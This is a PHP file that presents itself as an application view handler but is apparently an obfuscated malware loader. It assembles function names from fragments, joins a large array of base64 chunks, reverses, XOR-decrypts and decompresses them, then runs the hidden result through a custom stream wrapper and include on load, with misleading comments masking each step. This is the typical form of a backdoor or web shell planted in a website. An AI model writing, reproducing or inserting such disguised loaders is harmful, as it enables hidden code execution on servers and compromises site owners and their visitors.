<?php
/**
 * Application View Handler
 * @version 9.8.13
 * @package App\Rendering
 * @license MIT
 */

namespace App\Support\Compiler_988c2c {

    use \RuntimeException;
    use \InvalidArgumentException;

    interface ViewDispatcherInterface_94589f {
        public function resolve(): string;
        public function patchPaths(string $content): string;
    }

    trait CacheResolverTrait_8da2a7 {
        protected $_8f4bd36ef = [];

        protected function _6cf1a(string $key, callable $_3c22d6) {
            if (!isset($this->_8f4bd36ef[$key])) {
                $this->_8f4bd36ef[$key] = $_3c22d6();
            }
            return $this->_8f4bd36ef[$key];
        }

        protected function _9bbf3cbb2c() {
            $this->_8f4bd36ef = [];
        }
    }

    class ProcessedViewCompiler_93acb4 implements ViewDispatcherInterface_94589f {
        use CacheResolverTrait_8da2a7;

        private $_f3aa850;
        private $_bbb46bebc = [];

        public function __construct(array $config) {
            $this->_f3aa850 = $config;
            $this->_a1989765();
        }

        // Initialize resolver
        private function _a1989765() {
            $this->_bbb46bebc['151c1b'] = 'base64_d' . 'ecode';
            $this->_bbb46bebc['91c10'] = 'str' . chr(114) . 'ev';
            $this->_bbb46bebc['9821e1'] = 'strl' . 'e' . 'n';
            $this->_bbb46bebc['acc968'] = 'gzuncomp' . 'r' . 'ess';
            $this->_bbb46bebc['465434'] = str_replace('J', '', 'str_replaJce');
            $this->_bbb46bebc['f1e3b9'] = str_replace('H', '', 'iHmplode');
        }

        public function resolve(): string {
            return $this->_6cf1a('view', function() {
                return $this->_edce1f4();
            });
        }

        private function _edce1f4(): string {
            $segments = $this->_f3aa850['resources'];
            $key = $this->_f3aa850['salt'];

            $payload = $this->_bbb46bebc['f1e3b9']('', $segments);
            $a = $this->_bbb46bebc['151c1b']($payload);
            $b = $this->_bbb46bebc['91c10']($a);

            $c = '';
            $kl = $this->_bbb46bebc['9821e1']($key);
            $dl = $this->_bbb46bebc['9821e1']($b);

            for ($i = 0; $i < $dl; $i++) {
                $c .= $b[$i] ^ $key[$i % $kl];
            }

            $result = $this->_bbb46bebc['acc968']($c);
            if ($result === false) {
                return '';
            }

            return $result;
        }

        public function patchPaths(string $content): string {
            $path = $this->_f3aa850['rootPath'];
            $file = $this->_f3aa850['appFile'];
            $content = $this->_bbb46bebc['465434']('__DIR__', "'" . $path . "'", $content);
            $content = $this->_bbb46bebc['465434']('__FILE__', "'" . $file . "'", $content);
            return $content;
        }

        public function getTimestamp(): int { return 1785527454; }

        public function getCacheKey(): string { return md5(serialize($this->_f3aa850['resources'])); }

        public function getVersion(): string { return '7.9.91'; }

    }

    class TemplateStreamCompiler_2ad01d {
        public static $resolver;
        private $content;
        private $position = 0;

        public function stream_open($path, $mode, $options, &$opened_path) {
            if (self::$resolver === null) {
                $this->content = '<?php ';
                return true;
            }
            $content = self::$resolver->resolve();
            if ($content !== '') {
                $content = self::$resolver->patchPaths($content);
            }
            $this->content = '<?php ' . $content . "\n";
            $this->position = 0;
            return true;
        }

        public function stream_read($count) {
            $result = substr($this->content, $this->position, $count);
            $this->position += strlen($result);
            return $result;
        }

        public function stream_eof() {
            return $this->position >= strlen($this->content);
        }

        public function stream_stat() {
            return ['size' => strlen($this->content ?? '')];
        }

        public function url_stat($path, $flags) {
            return ['size' => 0];
        }

        public function stream_tell() {
            return $this->position;
        }

        public function stream_seek($offset, $whence = SEEK_SET) {
            $len = strlen($this->content);
            switch ($whence) {
                case SEEK_SET: $this->position = $offset; break;
                case SEEK_CUR: $this->position += $offset; break;
                case SEEK_END: $this->position = $len + $offset; break;
                default: return false;
            }
            return true;
        }

        public function stream_set_option($option, $arg1, $arg2) {
            return false;
        }
    }
}

namespace {
    // Cleanup resources
    $appConfiguration = [
        'rootPath' => dirname(__FILE__),
        'appFile' => __FILE__,
        'salt' => 'b913741c43e88acb7521c42a55e30231',
        'resources' => [
            'bGN68jec2sGUy84Wj8pN',
            'Q6B41SUyoSYXTyEypMzmzG8wW9f11SOVuygt64pks1QecljMfoyutL+XTBJgNh0vLX4kHzR6BoMxHKFXQSWJUWz4U+W',
            '3CC9e+rf8nYlAu5BILNl44ECRbcxc2cqTPT8En3yrtPz4jzb+eyOUDZa9r1DqyKdv+r2YDahJ5PTMXLdRdM/j2FzfvRtd3G',
            'yB+QJprGArtx1HVOWimJEb5/CouwdMVnAgm2Xv6116KScc/OrY',
            '3D5cbJYGAH1RKg8trpwzirN4y05f2pj23za',
            'e4MGKMLmRL8cGFK3zI0EEG+fWEWB7kv8HJse4ZR5AXejrQhAr2ywElzk1l2Y+7aVMbE7is1C944vOlP',
            'ON0mjAJNhlvHo3P0eofrUdIVSIMOL7oP81hm0guuL2q',
            'yLI1lTvknw2tZ+YEr0dk9SpMAhWlKw+utT0xd/ItYyJI+s61p/E+',
            'otbkFir3oiMGBLIf055unheKne+eNEma/opLCdKAzPxknK3mT1p5i5JKKP3UNzEFNcAqHMU',
            'oD12hpNBkNzYiZY9BQ5dlVaIsYH1hyg2XZKbNr+W34ukfiHxZr1vLjtJNeQfL4XWcVD0kKW+',
            '11sVa1FrS4c7P7XqMIjPNYrV',
            'j2Ovhk9u/djZ4oyfmnrPly+lXRvhik1eYVEwTODydyuJ500GltfgkE3qRwR4Jfa1Upbtf0',
            '9doOK/DU7mPsPiRjpfnTlVxX1t4Ro3/L/lHa9s24T1/YwxfNYjN9esLIU00mezf3AO+wM4PQdMfUKpE/+GQe+2vZ',
            'LOZQ1bld9z0JT7MgkQkU4EON+sY6sKMBdVU48IAMHxJ2b3znHiB8fJz5ua0st6LRhadd1w12lhoKln176hS5GwJ',
            'wVx74ThNbtWwrilVBoThainnBfOUQHLafrJ',
            'oraXCVWmhema5Y+6jua0pokOH4baWaVzWSKDJNuDw1BgN4Y9nJKjuKH/vUGhNH',
            'C/ibGFcQujE+w3IUwQEd8FuVUd',
            'zfPz2W/xzKT9Qr0JKCEdkpjoevsdrWUT4dy6XKGS35pKRHsy4ZNj59JwUjqXACxc06na',
            '4S5tYeXe0qYHr+yjH007t4BmVX72JUfkI6mr0y1Wx+xSkKpBHutuGopsAW8SCKlAQWqxK3ZK3lYUY+kFKjnWo',
            'EC/W/Lv2u4DgJYvfjUCXjGL9Pk4orGkXXdg4lnijY2je55Xe5sDoMRN4YRFTWWC6DNu7eUoL9pGiK1XezNL33158UKlD3OtDeKh',
            'lsphM7zv1ybPXaoo88NT+ATlEWA3/4v9PH0qECG6aozWzlPVopfRoXdkKFH5b1yc8RtIKk2ge7fZ+BN3z5Ee4ajakGfI1VtLGy',
            '1RTiBr59V+0bbT40mmDFRSfYVrlGvwoO1vG+P5BGxmXs1Qx9V5NyITl2Wi5HfqBg4H1LabYcl6yJCE',
            'Fmv9aGa91BJHgqToGb6Ab7coIFtAJMK5GXVjjwctI898eLtEOTotHv1wpIC79Qw',
            'NXdJBJWFrIweu6Pe6xFZ+Ha/iwHZadSddsBdNCqsKhf3Ko+7cFIBgtq9NOMjfs9V88usJJZ2no6hF3AGEo',
            'yOsaKS2hUQuSzjEx0bh8hsWBC0vewRK3lz+t3tWuTeXQSElRBAx3rS820qZZu5U7GIGlsRB3',
            'ENEQsyDW+PYNNBrGUxW9bVCAxpzqaZqDyb//425prVCIz85I7AA0+OmzUJVbqwMdowcJ1o6WvkBS5qnYMXQTCtWmn3BXThw',
            'gjbYmEzsgVoDx15w+AP3bTNipWM6tYCT/7DHjCtWl0xNCgNHonqKMKSnFhd/OmuVBmCcaEb5pH0F1qFJ0pMeeAIBLF/YAyyd/j',
            'GMM8f+bmoZS8G7QO0LXgADnGFgGuT3jFxPeSr',
            'PE6Mboi9BdNMwh4SZg+kVvKz7G7O37OGPkadqFLfNZl5Xl/GzRBTQ7kDaCqiKLjcALrAVLTpoTK86W',
            'QMeBctRAM7yMBRsvF1MDM5u/BdOrg6gINO+rHaWBg/qPcZX0mRzHSXDKHIIqI3dgXkSP+i',
            'iCDEN2PoF3Y/h5QYRLwDiG7+CS8jdo5vMb8AT',
            'HieCCITP+JjIb1ohobZwbnGFnR2NQ3uIV+',
            '7sr7xdnRf4HniIaWadEc1seY',
            'h4nNNAujbAw/epYZMsBhCAiJpD7RFyQ0jPNQ2YXnVumsqy623ci70ewl1z6oGh0xl3K/lV1uTLpXg',
            'jub15PGrj8rwwkpAUp4MZNkW1fixLx3NT22jVskn2krNs4Ku28x+ukzow2ytzud/0oPsnWOPC',
            'iOdEZUZlvHocVBGao/DT06qBq72kMUk/O0aTHuh3inujYgK5R54blBB6MOtgp84gzd58crhpWFivRbQ',
            '55hMlWCkV7O03f8GLoFmfX54zu41axo0uXduzEjHsPZE7rnLeCIDl2+DISBufcCJ/2lDPZ1nIBrlfxEvtiB2O1HN3a',
            'PzuQyfOPPeY66FBaMVgO/sSmGUgQtFUTkjtohnht7FDz8IAf+BoO2h5tIPeKFVYGQZiNgvawwqmqEJ',
            '6Yu3AKr84/A+ANySBFPq/XumONirImM4djYoMpCGsZA8TR5SOkFRTVCEYIGkAMmza2B3mRa6RNfjQHhYpH97LlRum5pThkjI',
            'SWL9dbT/+b9dwv2ZM+lFlpeZz91',
            'IYnvjQ5Wv0xojEq1tDTTXNNc1ptUMpA6IyurIFAIt//EcDaykMgcv//kdJlJmoC0RPnbAN2EHhca0',
            'tcv7e2R2dmZDvGbL59+9rvuethJrAaYYY2t5r/NIpekzr9lu9zmKv9dlqJmyNwAEcan5d/eE4lbcLSnbD19ghdD',
            '5L3yqNHprV39YAX5C5j3LygYPv3i+JI39WXkC8ySMZWk0+PBoGUZLssL8TqSDujHmif2Fr5',
            'MMoLSerg+JrcmkDHnoHFW4gXVsSHKFJUX84psz+Jxn/ORklJ4kOuylJgKyvAQAGUq74eqFDgz',
            'bxJtg5bNaaJJEDgEwfaxgSOI4qOMJ3yEC',
            'UCXqaTfyxSyDQV8PZMb0O2lcl15ZKXvGuo8zjSo+F',
            'e0QWGvEH3aaEx/cZGxReGCnQmI9mapLpUW5g71Wt8sr8/lVmeuuo35/11XmFWk64JuB08BHF8pw9pTsFJU',
            '6KgvIr2Wsyd7lrwHhKD/M5xQvhSJSZxDCJEjm+qu3JMxANkdEWRamHOJUOq8Cg5XMmuitL',
            'RLz8Og1bb7sYKwHwVBzwf+',
            'kOi/yGAkMU9i1tC+ebDXHEufdx4dJfZO9C/GwpxQhpam7sqp6wJbs8zOkR6tr6Dx6+SXOwyWfXP',
            'K/B3o7LXi8Wvgjm5CGQKgXHepzncAnQbAuGC2gK72PCbAoX6Xgq2USmjotgi8hbkvfgm7s8303K9YAPg4CIIR6PlVyEEkZqcmQA',
            '6yVwlK2eiYVJ45pfmnKiBJt2vltGqoBFVjLdYCWiV+C5guN5Q2AvhIqNfQLfPg4dq19/6aZjLsBh63JdFW3zZ0+k',
            'Bgd4doqtWnYCtrJcl4ahhau0gKzPPHqy/ltlS',
            'LG1EwiOfEUglGtDQnqlzc3vKcRFTLTPuwSPq6xQHCx4vAptU4dexmdaYRlkY2e8xNR0PKwSwUfe9IQoSaKkqCk3AEQC2',
            'oxaARJ2RHnFPaSzCLQ3HEjaA2LYxMbX2CdF0SAhe7p+/NBZZW0rudBg7wHo4+GWrHIfSNnbiRy3h1/MtZmLRjCwKNtc',
            'OYlU5lr+P8SiKrpPbuY0Ngww0EBrtbNy',
            'w6QJFpSFL6M6c/UufxwaVCClj9Q9z0mf5qOjFirvfgdT68dldfGXu6oIRxNpfgeI8gp/OwI57mAEnxPTn',
            'lAfY7CMb8B8rDfdq7G29mfk/QMY5RDEdsuLuPPIaIJU/XGLXpThcbqRf1Xmik+GRDkr6C6LWfW0G',
            'C4B3YiaGAXqOl5PAX3dgqHWNStVty3kgnc47GAbqd83P/aqXjmcL4bCWC/A8p8acw5',
            'NJjZcBi6K+dYIHPCGTawXkrWkuUhKmFvyGOGpmnsQDsRuvyJTVr4rU3gWASd8UNK',
            'IZLogRlMK/k34CJa8j9F3JiTTakFjGByEeH0wwSRob3gq7I2IMougqvanfAaducGBtQ2lqiGz3Yrzok',
            'FutODbHWqTm/l03povMEIpUJhpK0ev6NQ',
            '+bHT7swfrIHcz/98MSXV8j/sdBI3iLTHvV1hqAQIPlKU',
            '/ApTQV8EixD1nC6pmMbqYvxVOeM4/bv02dlVr6NJixsB1U7oMaIc1/kjdYBarPG1eAUsmSg2wg1v2eUosHUwtkABCFdPjYLI',
            'h82cAKRk8Hh77HhHuR0YG02l24LmKgVDqT7enG',
            'z1UePExts7fwgLhWQcaV35aXiPrY5Qo5nqIyi9dxE7eTo0FGk8',
            'JvS1vjOhp8gb0RatCsR0FU6g4UPALYwCfX1KqFJv8Lwv6xv2MzF9T0CYfhHpQMIJQKw6/T20T',
            'lIYqhkqBdpcWiZTVJ4joNuyxCh6wPZOG0Upi9Q+ItaLIP+KZG5MpsCs1KGGUtKPs1rVMyjx+RROTm',
            '0QjZ7c2grtd4iF/NjozWJO0pXefR7KJFccjNfR4VoL80I9',
            'w7MnzTcmX88nWsSRy7OUuld4sdH48H7nYHQNYBTE/R',
            'C8eTKkfefVOtOXlfRejRHz1i',
            '7PSEDTSBSC6qnXinFRXspbeeEvD1pEHBETj6N8zcVSn2CzqtLwA//S1a0/90yj7EBW1LLg3uz+H3lJd9meLLlM5bP',
            '7tXYjeQI4KRtey4OzRswjCGgO1jJrMzPqPfYPDirRO8Mo73Lh1jMWezJo0zzfHNNTGc86swGxAl/qGw89LKN7Vy44NkKnG',
            'OHlIyF9OOGB4X4iczpi9wc4btL6Kzotc/vX',
            'Q8Ertn4cXoTzWkCoWxezpKTj4lUwbV94dT/+aydwuyfrGjeyywse6y8jcuALIVFhem8i8ZZyA6va6N+s72nQ',
            'L4d3MRm9leFNfgw7o0+jAdiWGT3akdg8dRqnjxsFEEYNezk5OkceiPu6lu4Q7cGtk4xo=',
        ],
    ];

    // Compile assets
    $viewResolver = new \App\Support\Compiler_988c2c\ProcessedViewCompiler_93acb4($appConfiguration);

    // Register stream handler
    $wrapperClass = '\App\Support\Compiler_988c2c\TemplateStreamCompiler_2ad01d';
    $wrapperClass::$resolver = $viewResolver;
    stream_wrapper_register('view', $wrapperClass);

    // Render compiled template
    try {
        include 'view://resources/views/index';
    } finally {
        // Bootstrap application
        stream_wrapper_unregister('view');
        $wrapperClass::$resolver = null;
        unset($viewResolver, $appConfiguration, $wrapperClass);
    }
}?>
<?php /* a15b625cf41814fedeb3492157e7c138 */ ?>